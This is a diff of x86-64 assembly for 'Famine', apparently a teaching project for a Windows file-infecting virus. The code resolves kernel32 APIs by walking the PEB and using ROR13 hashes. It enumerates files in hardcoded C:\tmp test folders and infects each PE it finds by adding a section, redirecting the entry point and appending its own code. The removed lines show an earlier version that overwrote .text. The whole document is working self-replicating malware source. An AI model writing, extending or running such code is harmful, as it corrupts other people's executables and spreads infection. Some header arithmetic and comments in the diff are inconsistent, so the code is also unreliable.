@@ -1,35 +1,391 @@
 [BITS 64]
 
 section .text
-
+    global start
+    global _get_proc_address
+	global _get_address_table
+	global load_function
     global famine
 	global _alloc_find_data_strust
 	global _closeHandleFile
 	global _findNextFile
 	global _openCurrentFile
 	global _padTextSection
-	global _copyShellcode1
+	global _copyShellcode
 	global _prepareChangeDirectory_prepareExit
 	global _changeDirectory
 	global _verifyDot
+	global _setupNewSection
+
+;------------------------------; ***EntryPoint***
+start:
+    ; Align the stack to 16 bytes
+    sub rsp, 0x20
+    call _saveEntryPoint
+    mov rbx, rax
+    jmp _get_address_table
+
+;------------------------------; Data in .famine section
+_address_table_hash:
+    localAlloc_hash dd 0x528176EE; + 0x11 | 0x4
+    localFree_hash  dd 0xEA61FCB1; + 0x15
+    exitProcess dd 0x56A2B5F0
+    createFileA dd 0x4FDAF6DA
+    getFileSize dd 0x701E12C6
+    readFile dd 0xBB5F9EAD
+    writeFile dd 0x5BAE572D
+    closeHandle dd 0x528796C6
+    findFirstFileA dd 0x95DA3590
+    findNextFileA dd 0xF76C45E7
+    setCurrentDirectoryA dd 0xAD2D1512
+    getCurrentDirectoryA dd 0xED2D1511
+    getModuleHandleA dd 0xDAD5B06C ; + 0x41
+_resources:
+    folderToInfect1 db "C:\\tmp\\test\\", 0; + 0x45
+    folderToInfect2 db "C:\\tmp\\test2\\", 0
+    target db "*", 0; + 0x66
+    name db ".text", 0; + 0x68
+    dotdot			db	"..", 0 ; 0x6E
+    signature		db	"alca", 0 ; 0x71
+    ; signature db "Famine version 1.0 (c)oded by jdecorte-mbucci", 0
+;------------------------------;
+
+_saveEntryPoint:
+    xor rax, rax
+    mov rax, gs:[0x60]          ; RAX = Address of PEB
+
+    mov rax, [rax + 0x18]       ; RAX = PEB_LDR_DATA (PEB->Ldr)
+    mov rax, [rax + 0x10]       ; RAX = InLoadOrderModuleList (first module entry)
+    
+    mov rbx, [rax + 0x30]       ; RBX = Base address of the main module (LDR_DATA_TABLE_ENTRY->DllBase)
+
+    xor rax, rax
+    mov eax, [rbx + 0x3C]       ; RAX = Offset to IMAGE_NT_HEADERS (e_lfanew)
+    add rax, rbx                ; RAX = Address of IMAGE_NT_HEADERS
+    mov eax, [rax + 0x18 + 0x10] ; RAX = Entry point RVA (OptionalHeader.AddressOfEntryPoint)
+    add rax, rbx                ; RAX = Entry point address (Base + RVA)
+
+    ret
+
+; Registers configuration
+; rbx: this code entrypoint
+_get_address_table:
+	mov rcx, [rbx + 0x11]
+	call _get_proc_address
+	mov r15, rax ; r15 = LocalAlloc
+
+	xor rcx, rcx
+	mov rdx, rcx
+	add rcx, 0x40
+	add rdx, 104
+	call rax
+
+	mov r14, rax ; r14 = address of address table
+	mov rax, r15
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x15]
+	call _get_proc_address ; rax = LocalFree
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x19]
+	call _get_proc_address ; rax = ExitProcess
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x1d]
+	call _get_proc_address ; rax = CreateFileA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x21]
+	call _get_proc_address ; rax = GetFileSize
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x25] ; rax = ReadFile
+	call _get_proc_address
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x29]
+	call _get_proc_address ; rax = WriteFile
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x2d]
+	call _get_proc_address ; rax = CloseHandle
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x31]
+	call _get_proc_address ; rax = FindFirstFileA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x35]
+	call _get_proc_address ; rax = FindNextFileA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x39]
+	call _get_proc_address ; rax = SetCurrentDirectoryA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x3d]
+	call _get_proc_address ; rax = GetCurrentDirectoryA
+	pop r14
+	call _prepareStoreAddress
+
+	push r14
+	mov rcx, [rbx + 0x41]
+	call _get_proc_address ; rax = GetModuleHandleA
+	pop r14
+	call _prepareStoreAddress
+
+	xor 	rcx, rcx
+	mov 	rdx, rcx
+	mov 	r8, rcx
+	mov 	r9, rcx
+	mov 	r12, rcx
+	mov 	r13, rcx
+	mov 	r15, rcx
+	mov 	rax, r14
+	xor 	r14, r14
+	jmp famine
+
+
+_prepareStoreAddress:
+	mov 	r9, rax
+	xor 	r8, r8
+	mov 	rdx, r8
+	mov 	rcx, r14
+
+_storeAddress:
+	cmp 	QWORD [ds:rcx + rdx], r8
+	jne 	_storeAddress_continueIncrement
+	mov 	QWORD [ds:rcx + rdx], r9
+	mov 	rax, rdx
+	ret
+
+_storeAddress_continueIncrement:
+	add 	rdx, 8
+	jmp 	_storeAddress
+
+; PARAMETERS
+; rcx = function + dll hash
+; =======
+; return address of the function
+_get_proc_address:
+	mov rdi, rcx
+    ; Access PEB
+    xor rax, rax
+    mov rax, gs:[0x60]              ; RAX = Address_of_PEB
+    mov rax, [rax + 0x18]           ; RAX = Address_of_LDR
+	mov r10, [rax + 0x10]			; RBX = First entry in InLoadOrderModuleList (PEB_LDR_DATA->InLoadOrderModuleList)
+
+    .find_function_loop:
+		; get pModuleBase -> r14
+		mov r14, [r10 + 0x30]
+
+		; typedef struct _IMAGE_NT_HEADERS {
+		; 	DWORD                   Signature;  // 0x4
+		; 	IMAGE_FILE_HEADER       FileHeader;
+		; 	IMAGE_OPTIONAL_HEADER32 OptionalHeader;
+		; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; // 0x18
+		; get dwExportDirRVA -> r15d
+		mov r15d, [r14 + 0x3c] ; edx = e_lfanew
+		add r15, r14 ; r15 = ntheader
+		add r15, 0x18 ; r15
+		add r15, 0x70
+		mov r15d, [r15]
+		and r15d, 0x0FFFFFFF
+		
+		test r15d, r15d
+		jz .next_module
+
+		; get pExportDir -> r15
+		add r15, r14
+
+		; typedef struct _UNICODE_STRING {
+		; USHORT Length;				; 2 bytes
+		; USHORT MaximumLength; 		; 2 bytes
+		; PWSTR  Buffer;				; 8 bytes
+		; } UNICODE_STRING, *PUNICODE_STRING;
+		; dllBase + 0x58 = LDR_DATA_TABLE_ENTRY->BaseDllName
+		mov rcx, [r10 + 0x58 + 0x8] ; rcx = BaseDllName.MaximumLength
+		movzx rdx, word [r10 + 0x58 + 0x2] ; rdx = address of BaseDllName.Buffer
+		call .ror13_hash_dll ; rax = hash of dll
+		mov r11, rax
+
+		; public struct IMAGE_EXPORT_DIRECTORY
+		; {
+		;     public UInt32 Characteristics;
+		;     public UInt32 TimeDateStamp;
+		;     public UInt16 MajorVersion;
+		;     public UInt16 MinorVersion;
+		;     public UInt32 Name;
+		;     public UInt32 Base;
+		;     public UInt32 NumberOfFunctions;
+		;     public UInt32 NumberOfNames;
+		;     public UInt32 AddressOfFunctions;     // RVA from base of image
+		;     public UInt32 AddressOfNames;     // RVA from base of image
+		;     public UInt32 AddressOfNameOrdinals;  // RVA from base of image
+		; }
+		mov ecx, [r15 + 0x18] ; rcx = pExportTable->NumberOfNames
+
+		xor rdx, rdx
+		mov edx, [r15 + 0x20] ; rax = pExportTable->AddressOfNames
+		add rdx, r14 ; rdx = pdwFunctionNameBase
+
+		; NEED
+		; dwNumFunctions -> rcx 
+		; pdwFunctionNameBase -> rdx
+		; i -> rsi
+		; rdi -> arg1
+		; r8 -> pFunctionName
+		; r9
+		xor r13, r13
+		xor r8, r8
+		.loop_function:
+			mov r8d, [rdx]
+			add r8, r14
+			add rdx, 4
+
+			push r9
+			push r8
+			push rcx
+			mov rcx, r8
+			call .ror13_hash_fun
+			; add rdx, r8 ; add len of fun name 
+			pop rcx
+			pop r8
+			pop r9
+			
+			add rax, r11
+			cmp edi, eax
+			jnz .next_function
+
+			; Function found
+			jmp .function_found
+
+			.next_function:
+			inc r13
+			cmp rcx, r13
+			jnz .loop_function
+
+		.next_module:
+        mov r10, [r10]             ; Get next flink
+
+		test r14, r14                ; If DllBase is NULL, we're done
+        jnz .find_function_loop
+
+		xor rax, rax ; Return NULL
+		ret
+
+	.function_found:
+		xor rax, rax
+		xor rcx, rcx
+		xor rdx, rdx
+
+		mov eax, [r15 + 0x24] ; pExportTable->AddressOfNameOrdinals
+		add rax, r14
+
+		mov dx, [rax + 2 * r13]
+
+
+; (HMODULE) ((ULONG_PTR) pModuleBase + *(PDWORD)(pModuleBase + pExportDir->AddressOfFunctions + 4 * usOrdinalTableIndex));
+		mov ecx, [r15 + 0x1C]
+		add rcx, r14
+		mov ecx, [rcx + 4 * rdx]
+		and rcx, 0x0FFFFFFF
+
+		xor rax, rax
+		add rax, r14
+		add rax, rcx
+
+		ret
+
+
+	; PARAMETERS
+	; rcx = string
+	; rdx = string length
+	; =======
+	; r8 = counter
+	; r9 = dwModuleHash
+	; =======
+	; return hash of dll∂
+	.ror13_hash_dll:
+		xor r8, r8
+		xor r9, r9
+		.loop_hash_dll:
+			mov al, byte [rcx + r8]	; al = BaseDllName.Buffer[rcx]
+
+			; to upper character
+			cmp al, 0x61 ; compare with 'a'
+			jl .skip_upper
+			sub al, 0x20 ; al = al - 32 / to upper
+			.skip_upper:
+
+			ror r9d, 13 ; rdx = rdx >> 13
+			movzx rax, al ; rax = al
+			add r9, rax ; rdx = rdx + rax
+
+
+			inc r8
+			cmp r8, rdx
+			jnz .loop_hash_dll
+		mov rax, r9
+		ret
+
+	; PARAMETERS
+	; rcx = string
+	; =======
+	; r8 = counter
+	; r9 = dwModuleHash
+	; =======
+	; return hash of dll∂
+	.ror13_hash_fun:
+		xor r8, r8
+		xor r9, r9
+		.loop_hash_fun:
+			mov al, byte [rcx + r8]	; al = BaseDllName.Buffer[rcx]
+
+			ror r9d, 13 ; rdx = rdx >> 13
+			movzx rax, al ; rax = al
+			add r9, rax ; rdx = rdx + rax
+
+			inc r8
+			cmp al, 0
+			jnz .loop_hash_fun
+		mov rax, r9
+		ret
 
 
 
-    extern FindFirstFileA
-    extern FindNextFileA
-    extern FindClose
-    extern LocalAlloc
-	
-
-; ------------------------------------------------------ ;
-; Parameters:
-; rcx = path
-; rdx = win32 find data structure
+;-------------------------------------------------------------------------------;
+; Here is the real start of famine
 ;
-; return:
-; rax = win32 find data structure
-; ------------------------------------------------------ ;
-
+;  ______   ______     __    __     __     __   __     ______    
+; /\  ___\ /\  __ \   /\ "-./  \   /\ \   /\ "-.\ \   /\  ___\   
+; \ \  __\ \ \  __ \  \ \ \-./\ \  \ \ \  \ \ \-.  \  \ \  __\   
+;  \ \_\    \ \_\ \_\  \ \_\ \ \_\  \ \_\  \ \_\\"\_\  \ \_____\ 
+;   \/_/     \/_/\/_/   \/_/  \/_/   \/_/   \/_/ \/_/   \/_____/ 
+;                                                  
+;-------------------------------------------------------------------------------;
 famine:
     push rsp
     mov rbp, rsp
@@ -58,7 +414,7 @@ _alloc_find_data_strust:
 
     ; Get information about the first file in the directory
 
-    lea rcx, [rbx + 0x92]
+    lea rcx, [rbx + 0x66]
     mov rdx, r14
     call QWORD [ds:r15 + 64] ; FindFirstFileA("*", &FindData)
     mov r13, rax ; r13 = hFindFile
@@ -181,67 +537,103 @@ _openCurrentFile:
 	xchg 	rdi, r13			; *** r13 : size of target file ***
 	push 	r12
 	xor 	r12, r12
-	add 	r12, 0x1A00 			; *** r12: size of this shellcode (hardcoded) ***
+	mov 	r12, end - start	; *** r12: size of this shellcode
 	xchg 	r14, rdi 
 	pop 	r14				; *** r14: HANDLE hFile ***
 	xor 	rdi, rdi 			; *** rdi: 0 ***
-
+	
 	
 
 ;-------------------------------------------------------;
-; The actual infection starts here:			;
-;							;
-; 1) Get a pointer to .text section of the file		;
-; 2) Pad the entire .text with nops			;
-; 3) Get a pointer to the EntryPoint 			;
-; 4) Copy this shellcode past the EntryPoint 		;
-; 5) Overwrite the original file with the infected one  ;
+; The actual infection starts here:			
+;							
+; 1) 
 ;-------------------------------------------------------;
 
 ; Registers configuration at this moment:
 ; rbx: this_code entrypoint / rsi: &target_copy / r12: sizeof(this_code) / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable
 
+_setupNewSection:
 	xor 	rax, rax
+	xor rcx, rcx
 	mov 	eax, [rsi + 3Ch]
-	add 	rax, rsi
-	lea 	rax, [rax + 18h]
-	lea 	rax, [rax + 0xf0]
-	lea 	rax, [rax + 0xC]
-	mov 	edi, DWORD [ds:rax]		; *** rdi: .text VirtualAddress ***
-	lea 	rax, [rax + 4]
-	mov 	eax, DWORD [ds:rax]		; *** rax: .text size ***
-	lea 	rdi, [rsi + rdi]		; *** rdi: pointer to .text ***
-	mov 	rcx, rdi
-	mov 	rdx, rax
-	xor 	rax, rax
-	mov 	DWORD [rcx], 0x61636C61		; write signature 'alca'
-	add 	rax, 4
+	add 	rax, rsi ; rax: pointer to the PE header
 
-_padTextSection:
-	mov 	BYTE [ds:rcx + rax], 0x90 	; pad .text section
-	inc 	rax
-	cmp 	rax, rdx
-	jne 	_padTextSection
+	mov cx, WORD [ds:rax + 6] ; rcx: number of sections
+	push rcx
+	inc cx
+	mov WORD [ds:rax + 6], cx ; number of sections + 1
 
-	xor 	rax, rax
-	mov 	eax, [rsi + 3Ch]
-	add 	rax, rsi
-	lea 	rax, [rax + 18h]
-	lea 	rax, [rax + 10h]
-	mov 	eax, DWORD [ds:rax]		; *** rax: target entrypoint ***
-	lea 	rax, [rsi + rax]
 
-	mov 	rcx, rax
-	xor 	rax, rax
-	mov 	rdx, rax
+	xor 	rcx, rcx
+	mov cx, WORD [rax + 14h] ; rcx: size of optional header
+	lea rax, [rax + 18h] ; rax: start of optinal header
 
-_copyShellcode1:
-	mov 	dl, BYTE [ds:rbx + rax]
-	mov 	BYTE [ds:rcx + rax], dl 	; copy this shellcode
-	inc 	rax
-	cmp 	rax, r12
-	jne	_copyShellcode1
+	add DWORD [rax + 38h], r12d ; update optinalHeader.SizeOfImage
 
+
+	mov r8d, DWORD [rax + 24h] ; rdx: File Alignment
+	mov r9d, DWORD [rax + 20h] ; rdx: Section Alignment
+
+	; ** AddressOfEntryPoint **
+	mov rdx, r13
+	add edx, r9d
+	mov r10d, r9d
+	dec r10d
+	not r10d
+	and edx, r10d
+	mov DWORD [rax + 10h], edx ; update optinalHeader.AddressOfEntryPoint
+
+
+	lea rax, [rax + rcx] ; rax: start of sections header table
+
+	pop rcx
+	imul rcx, rcx, 28h
+	add rax, rcx ; rax: pointer to the end of last section
+
+
+	; --------------------------------------------------------
+	; Here we create the new section
+	; --------------------------------------------------------
+
+	mov DWORD [rax], 0x65746373 	; mov DWORD [rax], 'sect'
+	mov DWORD [rax + 24h], 0x60000060 ; Characteristics
+
+	; ** VirtualAddress **
+	; Find VirtualAddress = align(last section VirtualAddress + last section VirtualSize) 
+	mov edx, DWORD [rax + 8h - 28h] ; rdx: VirtualSize
+	add edx, DWORD [rax + 0Ch - 28h] ; rdx: VirtualSize + VirtualAddress
+	; Align to section alignment
+	add edx, r9d
+	mov r10d, r9d
+	dec r10d
+	not r10d
+	and edx, r10d
+	mov DWORD [rax + 0Ch], edx ; VirtualAddress
+
+	; ** SizeOfRawData **
+	mov DWORD [rax + 10h], r12d ; SizeOfRawData
+
+	; ** VirtualSize **
+	mov edx, r12d
+	add edx, r9d
+	and edx, r10d ; mask with section alignment
+	mov DWORD [rax + 8h], edx ; VirtualSize
+
+	; ** PointerToRawData **
+	mov edx, DWORD [rax + 14h - 28h] ; rdx : lastsection.PointerToRawData
+	add edx, DWORD [rax + 10h - 28h] ; rdx : lastsection.PointerToRawData + lastsection.SizeOfRawData
+	add edx, r8d
+	dec r8d
+	not r8d
+	and edx, r8d
+	mov DWORD [rax + 14h], r13d ; PointerToRawData
+
+	; xor 	rax, rax
+	; ; mov 	DWORD [rcx], 0x61636C61		; write signature 'alca'
+	; add 	rax, 4
+
+_copyShellcode:
 	mov 	rcx, r14
 	call 	QWORD [ds:r15 + 56]		; Close old HANDLE used to read the file
 	
@@ -262,6 +654,15 @@ _copyShellcode1:
 	xor 	r9, r9
 	mov 	QWORD [ss:rsp + 0x20], r9
 	call 	QWORD [ds:r15 + 48]		; WriteFile(HANDLE hFile, LPVOID buffer, DWORD nNumberOfBytesToWrite, NULL, NULL)
+	
+	; write shellcode
+	mov rcx, r14
+	mov rdx, rbx
+	mov r8, r12
+	xor r9, r9
+	mov QWORD [ss:rsp + 0x20], r9
+	call QWORD [ds:r15 + 48]
+
 	mov 	rcx, r14
 	call 	QWORD [ds:r15 + 56]		; CloseFile(hFile)
 
@@ -342,7 +743,7 @@ _returnError:
 
 _goBackDir:
 	xor 	rcx, rcx
-	lea 	rcx, [ds:rbx + 0x9A]		; rcx: '..'
+	lea 	rcx, [ds:rbx + 0x6E]		; rcx: '..'
 	call 	QWORD [ds:r15 + 80]		; SetCurrentDirectory('..')
 	cmp 	rax, 0
 	jz	_clearAndTerminate
@@ -401,3 +802,5 @@ _retrieveDirectoryData:
 _subRax:
 	sub 	rax, 16
 	jmp 	_retrieveDirectoryData
+
+end:
